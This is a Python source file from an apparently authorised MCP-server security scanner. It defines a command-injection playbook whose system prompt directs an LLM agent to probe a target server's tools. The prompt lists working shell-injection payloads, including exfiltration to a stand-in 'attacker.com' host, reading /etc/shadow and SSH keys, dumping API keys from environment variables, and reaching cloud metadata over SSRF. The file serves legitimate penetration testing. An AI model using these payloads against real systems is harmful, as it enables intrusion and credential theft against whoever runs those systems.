"""Command injection attack playbook."""

from __future__ import annotations

import json

from mcpfang.agents.base import BasePlaybook
from mcpfang.agents.context import AttackContext
from mcpfang.playbooks.registry import register_playbook
from mcpfang.reporting.models import Finding, Severity, FindingCategory


@register_playbook
class CommandInjectionPlaybook(BasePlaybook):
    name = "command_injection"
    category = "injection"
    severity_default = "high"
    cwe_ids = ["CWE-78", "CWE-77"]
    description = "Tests for OS command injection via tool parameters"

    def get_system_prompt(self, context: AttackContext) -> str:
        return f"""You are an expert security researcher performing a penetration test on an MCP server.
Your goal is to find COMMAND INJECTION & EXECUTION vulnerabilities (OWASP MCP05:2025).

In MCP environments, AI agents construct and execute system commands using untrusted input
from prompts, retrieved context, or tool outputs. This creates unique injection surfaces
where natural-language instructions get translated into executable operations.

{context.domain_context}

Available tools on the target server:
{context.tools_summary}

## Attack Strategy

### Phase 1: Identify injection surfaces
Look for tools that accept string parameters which might be used in shell commands,
file operations, system calls, or API requests. High-priority parameter names:
"command", "cmd", "path", "file", "query", "url", "host", "exec", "script",
"shell", "args", "input", "expression", "code", "template", "filter"

### Phase 2: Test shell metacharacter injection
Try each payload individually on suspicious parameters:
- `; id` or `; whoami` (command chaining via semicolon)
- `| cat /etc/passwd` (pipe injection)
- `$(whoami)` (command substitution)
- `` `id` `` (backtick execution)
- `%0aid` (newline injection / URL-encoded newline)
- `&& id` (AND chaining)
- `|| id` (OR chaining — runs if first command fails)
- `> /tmp/pwned` (output redirection)
- `\nid\n` (raw newline injection)

### Phase 3: Test blind injection
If no direct output is visible, test time-based and side-channel injection:
- `; sleep 5` — measure response time difference
- `$(sleep 5)` — command substitution sleep
- `` `sleep 5` `` — backtick sleep
- `| curl http://attacker.com/$(whoami)` — DNS/HTTP exfiltration
- `; echo VULN > /tmp/mcpfang_test` — file write canary

### Phase 4: Test environment variable extraction
Try to access secrets stored in environment variables (OWASP MCP01 overlap):
- `; env` or `; printenv` — dump all environment variables
- `; echo $ANTHROPIC_API_KEY` — targeted API key extraction
- `; echo $DATABASE_URL` — database connection string
- `; echo $SECRET_KEY` or `; echo $AWS_ACCESS_KEY_ID` — cloud credentials
- `${{ENV_VAR}}` — template-style variable expansion

### Phase 5: Test chained execution & lateral movement
If basic injection works, escalate:
- `; cat /etc/shadow` — password hash extraction
- `; curl http://169.254.169.254/latest/meta-data/` — SSRF to cloud metadata
- `; cat ~/.ssh/id_rsa` — SSH key theft
- `; cat /proc/self/environ` — process environment dump
- `; ls -la /` — filesystem reconnaissance
- `; netstat -tlnp` — network port enumeration
- `; cat /app/.env` or `; cat ../.env` — dotenv file extraction

### Phase 6: Test language-specific injection
If the server is Python/Node/Ruby based:
- `__import__('os').system('id')` — Python eval injection
- `require('child_process').execSync('id')` — Node.js injection
- `eval("1+1")` — generic eval test

Be methodical. Test one payload per tool call. Record exact inputs and outputs.
Report ALL findings with proof-of-concept payloads."""

    def get_initial_message(self, context: AttackContext) -> str:
        tool_names = [t.name for t in context.discovery.tools]
        return (
            f"Begin your command injection assessment. "
            f"The target has these tools: {', '.join(tool_names)}. "
            f"Start by testing the most likely injection surfaces."
        )

    def parse_findings(self, agent_output: str) -> list[Finding]:
        """Fallback parser for unstructured agent output."""
        findings = []
        # Look for indicators of successful injection in raw output
        injection_indicators = [
            "uid=", "root:", "/bin/", "whoami", "passwd",
            "command injection", "vulnerable to", "injection found",
        ]

        output_lower = agent_output.lower()
        if any(indicator in output_lower for indicator in injection_indicators):
            findings.append(Finding(
                id="INJ-001",
                title="Potential command injection detected",
                description="The agent detected indicators of command injection vulnerability.",
                severity=Severity.HIGH,
                category=FindingCategory.INJECTION,
                tool_name="unknown",
                playbook=self.name,
                cwe_ids=self.cwe_ids,
                raw_output=agent_output,
            ))

        return findings
